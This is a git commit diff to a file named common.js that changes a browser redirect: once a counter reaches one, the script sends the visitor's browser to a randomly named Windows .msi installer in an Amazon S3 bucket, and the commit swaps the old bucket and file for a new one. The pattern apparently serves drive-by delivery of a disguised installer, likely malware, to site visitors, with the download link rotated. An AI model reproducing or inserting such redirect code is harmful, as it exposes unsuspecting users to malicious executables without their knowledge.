03f549471efb19593385868a82de02fc875593ff
siwadiao <buoihandoan64147@gmail.com>
2025-08-12 00:16:12 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://ashwor.s3.ap-southeast-2.amazonaws.com/he11erwo1b.msi";
+		var url="https://fhuo11yood.s3.ap-southeast-2.amazonaws.com/fhuo11yood.msi";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
